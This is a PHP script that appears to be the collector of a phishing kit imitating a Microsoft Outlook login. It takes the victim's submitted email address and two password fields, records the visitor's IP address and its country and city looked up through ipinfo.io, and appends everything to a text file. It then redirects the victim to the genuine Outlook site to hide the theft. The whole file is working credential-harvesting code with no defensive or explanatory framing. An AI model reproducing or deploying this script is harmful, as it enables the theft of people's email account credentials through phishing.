<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];
$ip = $_SERVER['HTTP_CLIENT_IP'];
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];

$ip = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
echo "The user IP Address is - ". $ip;

$cc = trim(file_get_contents("http://ipinfo.io/{$ip}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$ip}/city"));


	
	$file = fopen("NEW01.txt", "a");
	
fwrite($file, 
"* EMAIL: ".$_POST['email']."
* PASS: ".$_POST['pass']."
* PASS1: ".$_POST['pass1']."
* F-H-IP-P-C: 
".date('Y-m-d')."
".date('H:i:s')."
".$userp."
".$ip."
".$cc."
".$city."   
" . PHP_EOL);
fwrite($file, "==============================" . PHP_EOL);
fclose($file);

header("location:https://outlook.live.com/owa/");

?>
